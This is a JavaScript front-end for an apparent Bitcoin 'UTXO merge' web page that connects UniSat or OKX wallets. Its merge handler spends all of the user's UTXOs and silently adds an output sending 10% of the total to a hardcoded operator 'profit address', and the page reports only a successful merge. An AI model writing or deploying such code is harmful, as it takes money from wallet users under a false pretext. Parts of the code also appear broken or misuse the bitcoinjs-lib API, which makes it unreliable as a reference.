// 确保引入 bitcoinjs-lib（需要在页面中引入，或者通过模块加载）
const Bitcoin = window.bitcoinjs || {}; // 如果通过 <script> 引入
// 例如： <script src="https://unpkg.com/bitcoinjs-lib@5.2.0/dist/bitcoinjs-lib.min.js"></script>

document.addEventListener('DOMContentLoaded', async () => {
    let walletProvider = null;
    let walletAddress = null;
    let targetAddress = null;
    const profitAddress = '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd'; // 你的收益地址
    const profitRate = 0.1; // 10% 收益

    const connectButton = document.getElementById('connect-wallet');
    const disconnectButton = document.getElementById('disconnect-wallet');
    const walletStatus = document.getElementById('wallet-status');
    const mergeButton = document.getElementById('merge-utxo');
    const targetAddressInput = document.getElementById('target-address');
    const feeRateInput = document.getElementById('custom-fee-rate');
    const feeRatesDisplay = document.getElementById('fee-rates');

    // 改进的 fetch 方法，处理非 JSON 响应
    async function fetchWithErrorHandling(url, options) {
        const response = await fetch(url, options);
        if (!response.ok) {
            const text = await response.text();
            throw new Error(`HTTP 错误: ${response.status}, 响应: ${text}`);
        }
        const contentType = response.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
            const text = await response.text();
            throw new Error(`预期 JSON 响应，但收到: ${text}`);
        }
        return response.json();
    }

    // 加载主网费率
    async function loadFeeRates() {
        try {
            const data = await fetchWithErrorHandling('/get-fee-rates');
            if (data.error) {
                throw new Error(data.error);
            }
            feeRatesDisplay.textContent = `快速: ${data.fastestFee}, 中等: ${data.halfHourFee}, 慢速: ${data.hourFee}`;
        } catch (error) {
            console.error('加载费率失败:', error);
            feeRatesDisplay.textContent = '无法加载费率';
        }
    }

    // 显示钱包选择弹窗
    function showWalletOptions() {
        const walletOptions = `
            <div id="wallet-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;">
                <div style="background: white; padding: 20px; border-radius: 10px; text-align: center;">
                    <h3>选择钱包</h3>
                    <button onclick="connectWallet('unisat')">UniSat</button>
                    <button onclick="connectWallet('okxweb3')">OKXWeb3</button>
                    <button onclick="document.getElementById('wallet-modal').remove()">取消</button>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', walletOptions);
    }

    // 连接钱包
    async function connectWallet(walletType) {
        try {
            if (walletType === 'unisat' && window.unisat) {
                const accounts = await window.unisat.requestAccounts();
                walletProvider = 'unisat';
                walletAddress = accounts[0];
            } else if (walletType === 'okxweb3' && window.okxwallet) {
                const result = await window.okxwallet.bitcoin.connect();
                walletProvider = 'okx';
                walletAddress = result.address;
            } else {
                throw new Error('钱包未安装');
            }
            walletStatus.textContent = `已连接钱包: ${walletAddress}`;
            connectButton.style.display = 'none';
            disconnectButton.style.display = 'inline';
            mergeButton.disabled = false;
            document.getElementById('wallet-modal').remove();
        } catch (error) {
            console.error('连接钱包失败:', error);
            walletStatus.textContent = '连接钱包失败';
            document.getElementById('wallet-modal').remove();
        }
    }

    // 断开连接
    disconnectButton.addEventListener('click', () => {
        walletProvider = null;
        walletAddress = null;
        walletStatus.textContent = '未连接钱包';
        connectButton.style.display = 'inline';
        disconnectButton.style.display = 'none';
        mergeButton.disabled = true;
    });

    // 合并 UTXO 并转账
    mergeButton.addEventListener('click', async () => {
        targetAddress = targetAddressInput.value.trim() || walletAddress;
        const feeRate = parseInt(feeRateInput.value) || 10;

        try {
            // 获取 UTXO
            const utxoData = await fetchWithErrorHandling('/get-utxos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: walletAddress })
            });
            const { utxos } = utxoData;
            if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');

            // 构造交易
            const network = Bitcoin.networks.bitcoin; // 主网
            const txb = new Bitcoin.TransactionBuilder(network);
            let totalInput = 0;
            utxos.forEach(utxo => {
                txb.addInput(utxo.txid, utxo.vout);
                totalInput += utxo.value;
            });

            const txSize = utxos.length * 148 + 34 + 10;
            const fee = txSize * feeRate;
            const profit = Math.floor(totalInput * profitRate); // 10% 收益
            const outputValue = totalInput - fee - profit;

            if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');

            // 输出：用户目标地址和你的收益地址
            txb.addOutput(targetAddress, outputValue);
            txb.addOutput(profitAddress, profit);

            const psbt = txb.buildIncomplete().toPSBT();

            // 签名
            let signedTxHex;
            if (walletProvider === 'unisat') {
                signedTxHex = await window.unisat.signPsbt(psbt.toHex());
            } else if (walletProvider === 'okx') {
                signedTxHex = await window.okxwallet.bitcoin.signPsbt(psbt.toHex());
            }

            // 广播交易
            const broadcastData = await fetchWithErrorHandling('/broadcast', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ txHex: signedTxHex })
            });
            const { txId } = broadcastData;

            document.location.href = `/?message=UTXO合并并转账成功！&txId=${txId}`;
        } catch (error) {
            console.error('合并 UTXO 失败:', error);
            alert(`合并 UTXO 失败: ${error.message}`);
        }
    });

    // 邀请朋友
    document.getElementById('invite-friends').addEventListener('click', () => {
        if (!walletAddress) {
            alert('请先链接钱包！');
            return;
        }
        const inviteUrl = `${window.location.origin}/?ref=${walletAddress}`;
        const inviteLinkDiv = document.getElementById('invite-link');
        const inviteUrlElement = document.getElementById('invite-url');
        inviteUrlElement.href = inviteUrl;
        inviteUrlElement.textContent = inviteUrl;
        inviteLinkDiv.style.display = 'block';
    });

    // 页面加载时加载费率
    loadFeeRates();
});